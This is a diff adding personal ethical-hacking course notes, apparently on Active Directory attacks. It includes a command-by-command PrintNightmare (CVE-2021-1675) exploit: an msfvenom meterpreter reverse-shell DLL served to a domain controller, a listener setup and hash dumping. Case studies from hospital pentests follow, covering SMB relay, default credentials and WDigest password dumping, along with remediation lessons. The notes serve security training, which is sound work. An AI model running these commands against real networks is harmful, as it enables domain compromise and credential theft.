@@ -1148,3 +1148,142 @@ users to add printers that run as -->  <span style="color:#00b050">system privil
 =>
 any authenticated attacker can -->  <span style="color:#00b050">code execution</span>
 
+First thing:
+- the steps are described in this [repo](https://github.com/cube0x0/CVE-2021-1675)
+- check if the victim domain is vulnerable:
+  `rpcdump.py @<domain controller IP> | egrep 'MS-RPRN|MS-PAR'`
+  ![[Pasted image 20240304153716.png]]
+  if we obtain this =>  <span style="color:#00b050">domain controller is vulnerable</span>
+
+=>
+##### Update/install Impacket
+to run the attack:
+- update impacket
+	- `pip3 uninstall impacket`
+	- `git clone https://github.com/cube0x0/impacket`
+	- `cd impacket`
+	- `python3 ./setup.py install`
+	  
+- from the repo below:
+	- copy the code in the `CVE-2021-1675.py`
+	- save it locally inside the impacket folder
+
+- we need to create a malicious DLL and host it:
+	- create a malicious DLL:
+		- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=5555 -f dll > shell.dll`
+	- set up the listener:
+		- `msfconsole`
+		- `use multi/handler`
+		- `options`
+		- `set payload windows/x64/meterpreter/reverse_tcp`
+		- `set LPORT 5555`
+		- `set LHOST LHOST=<attacker IP>`
+		- run
+	- set up a file share:   (we need to share the shell.dll)
+		- `smbserver.py share 'pwd'`
+=>
+we have set up everything
+Now:
+<span style="background:#fff88f">we need only to run the attack:</span>
+- go inside the impacket folder
+- `python3 CVE-2021-1675.py marvel.local/fcastle:Password1@<domain controller IP> \\<attacker IP (to go the file share)\share\shell.dll> `
+> [!warning] if it fails
+> set up the file share with the `-smb2support` option
+> =>
+> `smbserver.py share 'pwd' -smb2support`
+> 
+> run again the attack
+
+=>
+<span style="color:#00b050">we can dump all the hashes</span>
+
+
+
+
+
+### AD Case Study 
+#### AD Case Study 1
+we are going to see 3 case studies where all the attacks that we saw didn't work
+so you need something else
+
+scenario:
+- internal pentest (in an US hospital)
+- they spent a lot of money in Defences:
+	- IPv6 disabled => no mitm6 attack
+	- IDS/IPS
+	- CyberArk =>  tools that makes responder useles
+	  
+what are we missing?
+- nothing about [[Notes_ETH#SMB Relay Attack|smb Relay Attack]]
+  =>
+  indeed this attack worked
+- they could relay on a machine that had -->  <span style="color:#00b050">smb signing disabled</span>
+- from here they could dump -->  all the hashes of the users (include the Administrator)
+- By cracking the hashes -->  they found one password
+- with it they had a shell
+
+what is the lesson here:
+- this client spent a lot in security
+- but miss some basics locally configuration -->  as <span style="color:#00b050">smb signing disabled</span>
+
+1) **Enable SMB Signing (and disabled LLMNR)** – If I do not have the ability to perform the relay attack, I don’t get my initial shell.  While the possibility of other footholds exist, eliminating any potential foothold can slow down or completely prevent an attacker (motivation dependent, of course).
+
+2) **Least privilege** – I know this is easier said than done, but preventing users from being administrators on their machine (and especially multiple machines) goes a long way in regards to properly securing your network.
+
+3) **Account tiering** – If Bob is a domain admin, then Bob should have at least two domain accounts.  One account for everyday use and one account that one logs into the domain controller with when absolutely necessary.  Having a domain admin be part of an LLMNR or relay attack could signal game over immediately if weak policies are in place.
+
+4) **DON’T REUSE YOUR PASSWORDS** – This should make sense by now, yeah?  Not only should you have strong passwords, but you should also only being using the passwords one time only.  If an attacker gets shell access to a machine and dumps the hash, the hash/password should work nowhere else.  It certainly shouldn’t work on nearly every computer in the network and it certainly shouldn’t disable endpoint protection.
+
+
+
+#### AD Case Study 2
+scenario:
+- internal pentest (in an US hospital)
+- they spent a lot of money in Defences:
+	- IPv6 disabled => no mitm6 attack
+	- no LLMNR
+	- SMB Signing enabled
+	- IDS/IPS
+	- A/V on all devices
+
+we can't perform any of the easy attacks
+=>
+start thinking outside the box:
+<span style="color:#00b050">what is available in the network?</span> 
+look for printers/devices/default credentials
+
+what they found:
+- they found a tool in development -->  that has a password in clear text:
+                                  _<span style="color:#00b050">Local Administrative Password: ...</span>
+- we don't know the user associated to it
+  =>
+  but we can try with the administrator user
+- they tried with [[cheet#crackmapexec]] -->  and they found a machine
+- now they ran -->  [[cheet#secretsdump]] -->  to find any relevant info
+	- by dumping hashes they found that:
+		- the Administrator and admin account had the same hash
+		  =>
+		  they ran again -->  crackmapexec with the new account found
+		  
+We can also often find cleartext credentials.  
+Sometimes, these cleartext credentials show up in the form of <span style="color:#00b050">WDigest</span>, which is enabled by default on Windows 7, Windows 8, Windows Server 2008 R2, and Windows Server 2012.
+
+<span style="background:#fff88f">What’s so special about WDigest?</span> 
+It stores the credentials of any user that has logged into that machine since it has been turned on in clear text.  Imagine an environment where devices are still running on older versions of Windows.  This is pretty common in hospitals.  
+Now imagine we log onto a machine that is vulnerable and a domain administrator has logged into it as well.
+
+We’ll capture a domain administrator’s password in clear text, as such:
+![[Pasted image 20240304163216.png]]
+As you can see above, we have managed to dump out two accounts.  Both of which were domain admins.
+
+Once we have our domain administrator password, we can go log into the domain controller
+
+lessons learned:
+- No default credentials
+- turn off WDigest
+- Don’t give service accounts Domain Admin access
+- DON’T REUSE YOUR PASSWORDS
+
+
+
+#### AD Case Study 3
